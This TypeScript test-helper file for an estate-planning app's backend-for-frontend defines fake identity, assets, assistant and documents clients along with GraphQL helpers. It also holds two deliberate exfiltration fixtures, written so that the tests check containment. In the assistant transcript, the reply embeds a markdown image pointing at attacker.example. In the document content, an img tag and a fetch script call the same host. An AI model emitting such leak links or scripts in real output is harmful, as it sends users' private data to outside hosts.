import 'reflect-metadata';
import { createHash } from 'node:crypto';
import type { INestApplication } from '@nestjs/common';
import request from 'supertest';
import type { Response as SupertestResponse } from 'supertest';
import { createBffApp } from '../src/app';
import type {
  Asset,
  AssetsClient,
  CreateAssetInput,
  CreateResult,
  NetWorth,
} from '../src/assets-client';
import type {
  AnalysisName,
  AnalysisView,
  AssistantClient,
  Conversation,
  Transcript,
  Turn,
} from '../src/assistant-client';
import type { BffConfig } from '../src/config';
import type {
  Document,
  DocumentContent,
  DocumentTemplate,
  DocumentVersion,
  DocumentsClient,
  GenerateInput,
  GenerateResult,
  RegenerateInput,
} from '../src/documents-client';
import type {
  IdentityClient,
  IdentitySession,
  IssuedTokens,
  TotpEnrollment,
} from '../src/identity-client';
import type { PersistedOperationsManifest } from '../src/persisted';

export function testConfig(overrides: Partial<BffConfig> = {}): BffConfig {
  return {
    nodeEnv: 'test',
    port: 0,
    identityUrl: 'http://identity.test',
    assetsUrl: 'http://assets.test',
    aiAssistantUrl: 'http://assistant.test',
    documentsUrl: 'http://documents.test',
    persistedManifestPath: null,
    ...overrides,
  };
}

export const TOKENS: IssuedTokens = {
  accessToken: 'access-token-value-123',
  refreshToken: 'refresh-token-value-456',
  sessionId: 'a2c2e6a4-0000-4000-8000-000000000001',
  userId: 'a2c2e6a4-0000-4000-8000-000000000002',
};

/** Configurable in-memory fake; records every call. No network. */
export class FakeIdentityClient implements IdentityClient {
  registerCalls: Array<{ email: string; password: string }> = [];
  loginCalls: Array<{ email: string; password: string }> = [];
  refreshCalls: string[] = [];
  sessionCalls: string[] = [];
  totpEnrollCalls: string[] = [];
  totpVerifyCalls: Array<{ accessToken: string; code: string }> = [];
  stepUpCalls: Array<{ accessToken: string; code: string }> = [];
  exportDemoCalls: string[] = [];

  loginResult: IssuedTokens = TOKENS;
  refreshResult: IssuedTokens = TOKENS;
  sessionResult: IdentitySession | null = null;
  totpEnrollResult: TotpEnrollment = { otpauthUri: 'otpauth://totp/estate:user?secret=abc' };

  loginError: Error | null = null;
  refreshError: Error | null = null;

  register(email: string, password: string): Promise<void> {
    this.registerCalls.push({ email, password });
    return Promise.resolve();
  }

  login(email: string, password: string): Promise<IssuedTokens> {
    this.loginCalls.push({ email, password });
    if (this.loginError) {
      return Promise.reject(this.loginError);
    }
    return Promise.resolve(this.loginResult);
  }

  refresh(refreshToken: string): Promise<IssuedTokens> {
    this.refreshCalls.push(refreshToken);
    if (this.refreshError) {
      return Promise.reject(this.refreshError);
    }
    return Promise.resolve(this.refreshResult);
  }

  session(accessToken: string): Promise<IdentitySession | null> {
    this.sessionCalls.push(accessToken);
    return Promise.resolve(this.sessionResult);
  }

  totpEnroll(accessToken: string): Promise<TotpEnrollment> {
    this.totpEnrollCalls.push(accessToken);
    return Promise.resolve(this.totpEnrollResult);
  }

  totpVerify(accessToken: string, code: string): Promise<void> {
    this.totpVerifyCalls.push({ accessToken, code });
    return Promise.resolve();
  }

  stepUp(accessToken: string, code: string): Promise<void> {
    this.stepUpCalls.push({ accessToken, code });
    return Promise.resolve();
  }

  exportDemo(accessToken: string): Promise<void> {
    this.exportDemoCalls.push(accessToken);
    return Promise.resolve();
  }

  logoutCalls: string[] = [];
  logoutError: Error | null = null;
  /** false models identity's 401: the ACCESS token expired, session still live. */
  logoutResult = true;
  logoutByRefreshCalls: string[] = [];
  logoutByRefreshError: Error | null = null;

  logout(accessToken: string): Promise<boolean> {
    this.logoutCalls.push(accessToken);
    return this.logoutError ? Promise.reject(this.logoutError) : Promise.resolve(this.logoutResult);
  }

  logoutByRefresh(refreshToken: string): Promise<void> {
    this.logoutByRefreshCalls.push(refreshToken);
    return this.logoutByRefreshError
      ? Promise.reject(this.logoutByRefreshError)
      : Promise.resolve();
  }
}

export const ASSET: Asset = {
  assetId: 'a2c2e6a4-0000-4000-8000-00000000000a',
  category: 'cash',
  title: 'Checking account',
  estValue: '1200.50',
  valuationAsOf: '2026-07-01',
  ownershipPct: 100,
  inTrust: false,
  version: '3',
};

/** Configurable in-memory fake; records every call and the token it saw. */
export class FakeAssetsClient implements AssetsClient {
  listCalls: string[] = [];
  netWorthCalls: string[] = [];
  createCalls: Array<{ accessToken: string; input: CreateAssetInput }> = [];

  listResult: Asset[] = [ASSET];
  netWorthResult: NetWorth = {
    totalValue: '1200.50',
    assetCount: 1,
    valuedAssetCount: 1,
    inTrustValue: '0',
  };
  createResult: CreateResult = { assetId: ASSET.assetId, version: '1' };
  listError: Error | null = null;

  list(accessToken: string): Promise<Asset[]> {
    this.listCalls.push(accessToken);
    return this.listError ? Promise.reject(this.listError) : Promise.resolve(this.listResult);
  }

  netWorth(accessToken: string): Promise<NetWorth> {
    this.netWorthCalls.push(accessToken);
    return Promise.resolve(this.netWorthResult);
  }

  create(accessToken: string, input: CreateAssetInput): Promise<CreateResult> {
    this.createCalls.push({ accessToken, input });
    return Promise.resolve(this.createResult);
  }
}

/** One OK analysis, the shape the readiness page renders. */
export const ANALYSIS: AnalysisView = {
  status: 'OK',
  reason: null,
  findings: [
    {
      code: 'asset_not_titled_in_trust',
      severity: 'high',
      subject: { kind: 'asset', ref: ASSET.assetId, label: 'The lake house' },
      detail: { category: 'real_estate', estValue: '250000.00' },
    },
  ],
  disclaimer: 'Automated analysis for education only. Not legal or tax advice.',
};

/** Configurable in-memory fake; records every call and the token it saw. */
export class FakeAssistantClient implements AssistantClient {
  analysisCalls: Array<{ accessToken: string; name: AnalysisName }> = [];
  consentsCalls: string[] = [];
  grantCalls: Array<{ accessToken: string; scope: string }> = [];
  revokeCalls: Array<{ accessToken: string; scope: string }> = [];

  /** Per-analysis overrides; anything unset answers ANALYSIS. */
  analysisResults = new Map<AnalysisName, AnalysisView>();
  analysisError: Error | null = null;
  consentsResult: string[] = ['assistant.enabled'];
  grantError: Error | null = null;

  analysis(accessToken: string, name: AnalysisName): Promise<AnalysisView> {
    this.analysisCalls.push({ accessToken, name });
    if (this.analysisError) {
      return Promise.reject(this.analysisError);
    }
    return Promise.resolve(this.analysisResults.get(name) ?? ANALYSIS);
  }

  consents(accessToken: string): Promise<string[]> {
    this.consentsCalls.push(accessToken);
    return Promise.resolve(this.consentsResult);
  }

  grantConsent(accessToken: string, scope: string): Promise<string[]> {
    this.grantCalls.push({ accessToken, scope });
    if (this.grantError) {
      return Promise.reject(this.grantError);
    }
    this.consentsResult = [...new Set([...this.consentsResult, scope])];
    return Promise.resolve(this.consentsResult);
  }

  revokeConsent(accessToken: string, scope: string): Promise<string[]> {
    this.revokeCalls.push({ accessToken, scope });
    this.consentsResult = this.consentsResult.filter((granted) => granted !== scope);
    return Promise.resolve(this.consentsResult);
  }

  // ---- the conversation surface (M11) --------------------------------------

  conversationsCalls: string[] = [];
  transcriptCalls: Array<{ accessToken: string; conversationId: string }> = [];
  startCalls: string[] = [];
  sendCalls: Array<{ accessToken: string; conversationId: string; text: string }> = [];
  deleteCalls: Array<{ accessToken: string; conversationId: string }> = [];

  conversationsResult: Conversation[] = [CONVERSATION];
  transcriptResult: Transcript = TRANSCRIPT;
  turnResult: Turn = TURN;
  conversationError: Error | null = null;

  conversations(accessToken: string): Promise<Conversation[]> {
    this.conversationsCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.conversationsResult);
  }

  transcript(accessToken: string, conversationId: string): Promise<Transcript> {
    this.transcriptCalls.push({ accessToken, conversationId });
    return this.reject() ?? Promise.resolve(this.transcriptResult);
  }

  startConversation(accessToken: string): Promise<Conversation> {
    this.startCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(CONVERSATION);
  }

  sendMessage(accessToken: string, conversationId: string, text: string): Promise<Turn> {
    this.sendCalls.push({ accessToken, conversationId, text });
    return this.reject() ?? Promise.resolve(this.turnResult);
  }

  deleteConversation(accessToken: string, conversationId: string): Promise<void> {
    this.deleteCalls.push({ accessToken, conversationId });
    return this.reject() ?? Promise.resolve();
  }

  /** One place to inject a downstream failure across the conversation surface. */
  private reject<T>(): Promise<T> | null {
    return this.conversationError === null ? null : Promise.reject(this.conversationError);
  }
}

export const CONVERSATION: Conversation = {
  conversationId: 'c0nv0000-0000-4000-8000-00000000000c',
  createdAt: '2026-08-05T10:00:00.000Z',
  updatedAt: '2026-08-05T10:05:00.000Z',
};

/**
 * A transcript carrying an EXFILTRATION PAYLOAD as the assistant's text, so the
 * tests downstream of here are exercising the case docs/03 §6d cares about
 * rather than a friendly sentence.
 */
export const TRANSCRIPT: Transcript = {
  conversationId: CONVERSATION.conversationId,
  messages: [
    {
      messageId: 'm0000000-0000-4000-8000-000000000001',
      seq: 0,
      role: 'user',
      text: 'what do I own?',
      createdAt: '2026-08-05T10:00:00.000Z',
    },
    {
      messageId: 'm0000000-0000-4000-8000-000000000002',
      seq: 1,
      role: 'assistant',
      text: 'You have one property. ![](https://attacker.example/?d=leak)',
      createdAt: '2026-08-05T10:00:05.000Z',
    },
  ],
};

export const TURN: Turn = {
  conversationId: CONVERSATION.conversationId,
  messageId: 'm0000000-0000-4000-8000-000000000003',
  text: 'Your estate looks in order.',
  toolCalls: 1,
};

// ---- documents (M12) --------------------------------------------------------

export const TEMPLATE: DocumentTemplate = {
  templateId: 'd0000000-0000-4000-8000-00000000000t',
  docType: 'will',
  state: 'CA',
  version: 1,
  legalReviewAt: '2026-07-23T00:00:00.000Z',
  executionRequirements: { witnesses: 2, notarization: false, selfProvingAffidavit: false },
  variables: [
    {
      name: 'testatorName',
      kind: 'text',
      label: 'Full legal name',
      required: true,
      maxLength: 200,
    },
    { name: 'hasMinorChildren', kind: 'boolean', label: 'Minor children?', required: true },
  ],
};

export const DOCUMENT: Document = {
  documentId: 'd0000000-0000-4000-8000-00000000000d',
  docType: 'will',
  source: 'generated',
  title: 'Last Will and Testament',
  currentVersion: 1,
  executionStatus: 'generated',
  executedAt: null,
  legalHold: false,
  sealed: false,
  templateId: TEMPLATE.templateId,
  createdAt: '2026-08-05T10:00:00.000Z',
  updatedAt: '2026-08-05T10:00:00.000Z',
};

export const DOCUMENT_VERSION: DocumentVersion = {
  version: 1,
  contentSha256: 'a'.repeat(64),
  sizeBytes: 512,
  mime: 'text/html',
  createdAt: '2026-08-05T10:00:00.000Z',
};

/**
 * Content carrying an EXFILTRATION PAYLOAD, on the TRANSCRIPT precedent: the
 * viewer's job is to contain document markup, so the fixtures downstream of
 * here exercise that rather than a friendly paragraph.
 */
export const DOCUMENT_CONTENT: DocumentContent = {
  documentId: DOCUMENT.documentId,
  version: 1,
  mime: 'text/html',
  contentSha256: DOCUMENT_VERSION.contentSha256,
  encoding: 'utf8',
  content:
    '<!doctype html><html><body><h1>Last Will</h1>' +
    '<img src="https://attacker.example/?d=leak"><script>fetch("https://attacker.example")</script>' +
    '</body></html>',
};

/** Configurable in-memory fake; records every call and the token it saw. */
export class FakeDocumentsClient implements DocumentsClient {
  templatesCalls: Array<{ accessToken: string; state: string }> = [];
  listCalls: string[] = [];
  getCalls: Array<{ accessToken: string; documentId: string }> = [];
  versionsCalls: Array<{ accessToken: string; documentId: string }> = [];
  contentCalls: Array<{ accessToken: string; documentId: string; version: number }> = [];
  generateCalls: Array<{ accessToken: string; input: GenerateInput }> = [];
  regenerateCalls: Array<{ accessToken: string; documentId: string; input: RegenerateInput }> = [];

  templatesResult: DocumentTemplate[] = [TEMPLATE];
  listResult: Document[] = [DOCUMENT];
  getResult: Document = DOCUMENT;
  versionsResult: DocumentVersion[] = [DOCUMENT_VERSION];
  contentResult: DocumentContent = DOCUMENT_CONTENT;
  generateResult: GenerateResult = {
    documentId: DOCUMENT.documentId,
    version: 1,
    contentSha256: DOCUMENT_VERSION.contentSha256,
    executionStatus: 'generated',
  };
  documentsError: Error | null = null;

  templates(accessToken: string, state: string): Promise<DocumentTemplate[]> {
    this.templatesCalls.push({ accessToken, state });
    return this.reject() ?? Promise.resolve(this.templatesResult);
  }

  list(accessToken: string): Promise<Document[]> {
    this.listCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.listResult);
  }

  get(accessToken: string, documentId: string): Promise<Document> {
    this.getCalls.push({ accessToken, documentId });
    return this.reject() ?? Promise.resolve(this.getResult);
  }

  versions(accessToken: string, documentId: string): Promise<DocumentVersion[]> {
    this.versionsCalls.push({ accessToken, documentId });
    return this.reject() ?? Promise.resolve(this.versionsResult);
  }

  content(accessToken: string, documentId: string, version: number): Promise<DocumentContent> {
    this.contentCalls.push({ accessToken, documentId, version });
    return this.reject() ?? Promise.resolve(this.contentResult);
  }

  generate(accessToken: string, input: GenerateInput): Promise<GenerateResult> {
    this.generateCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(this.generateResult);
  }

  regenerate(
    accessToken: string,
    documentId: string,
    input: RegenerateInput,
  ): Promise<GenerateResult> {
    this.regenerateCalls.push({ accessToken, documentId, input });
    return this.reject() ?? Promise.resolve(this.generateResult);
  }

  private reject<T>(): Promise<T> | null {
    return this.documentsError === null ? null : Promise.reject(this.documentsError);
  }
}

export interface TestAppOptions {
  config?: BffConfig;
  identity?: IdentityClient;
  assets?: AssetsClient;
  assistant?: AssistantClient;
  documents?: DocumentsClient;
  manifest?: PersistedOperationsManifest;
}

export async function makeApp(options: TestAppOptions = {}): Promise<INestApplication> {
  const app = await createBffApp({
    config: options.config ?? testConfig(),
    identity: options.identity ?? new FakeIdentityClient(),
    assets: options.assets ?? new FakeAssetsClient(),
    assistant: options.assistant ?? new FakeAssistantClient(),
    documents: options.documents ?? new FakeDocumentsClient(),
    persistedOperations: options.manifest ?? new Map(),
    logger: false,
  });
  await app.init();
  return app;
}

export interface GqlRequestOptions {
  /** Omit the x-estate-csrf header entirely. */
  omitCsrf?: boolean;
  csrfValue?: string;
  cookie?: string;
}

export async function gql(
  app: INestApplication,
  body: Record<string, unknown>,
  options: GqlRequestOptions = {},
): Promise<SupertestResponse> {
  let req = request(app.getHttpServer() as Parameters<typeof request>[0])
    .post('/graphql')
    .set('accept', 'application/json')
    .set('content-type', 'application/json');
  if (!options.omitCsrf) {
    req = req.set('x-estate-csrf', options.csrfValue ?? '1');
  }
  if (options.cookie !== undefined) {
    req = req.set('cookie', options.cookie);
  }
  return req.send(JSON.stringify(body));
}

interface GqlError {
  message: string;
  extensions?: { code?: string };
}

export interface GqlBody {
  data?: Record<string, unknown> | null;
  errors?: GqlError[];
}

/** Typed view over supertest's `any` response body. */
export function gqlBody(res: SupertestResponse): GqlBody {
  return res.body as GqlBody;
}

export function sha256Hex(document: string): string {
  return createHash('sha256').update(document, 'utf8').digest('hex');
}

export const SESSION_QUERY = 'query Session { session { userId mfaLevel stepUpFresh } }';
export const LOGIN_MUTATION =
  'mutation Login($email: String!, $password: String!) { login(email: $email, password: $password) { ok } }';
